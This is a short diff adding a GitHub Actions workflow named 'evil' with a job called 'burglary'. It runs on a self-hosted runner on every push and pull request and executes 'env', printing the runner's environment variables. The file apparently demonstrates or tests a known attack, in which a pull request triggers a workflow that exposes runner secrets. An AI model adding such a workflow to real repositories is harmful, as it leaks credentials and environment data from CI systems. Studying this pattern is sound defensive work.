@@ -1,0 +1,7 @@
+on: [ push, pull_request ]
+name: evil
+jobs:
+    burglary:
+        runs-on: self-hosted
+        steps:
+            - run: env
